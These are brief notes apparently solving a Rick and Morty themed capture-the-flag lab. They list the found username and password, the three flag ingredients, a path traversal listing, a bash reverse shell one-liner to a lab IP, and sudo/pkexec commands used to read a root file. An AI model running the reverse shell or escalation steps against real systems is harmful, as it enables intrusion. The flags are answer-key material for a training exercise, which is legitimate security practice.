```
Note to self, remember username!

Username: R1ckRul3s
robots.txt -> Wubbalubbadubdub
Rick is sup4r cool -> title
```

```
less Sup3rS3cretPickl3Ingred.txt


mr. meeseek hair #First Ingredient

```

```
cd ../../../home/rick && ls -la && less *

1 jerry tear
```

```
/bin/bash -c 'bash -i >& /dev/tcp/10.8.15.76/9999 0>&1'
```

```
www-data@ip-10-10-97-44:/home/ubuntu$ sudo -l

Matching Defaults entries for www-data on
    ip-10-10-97-44.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-97-44.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

# we can abuse the pkexec
sudo pkexec --user root cat /root/3rd.txt

fleeb juice
```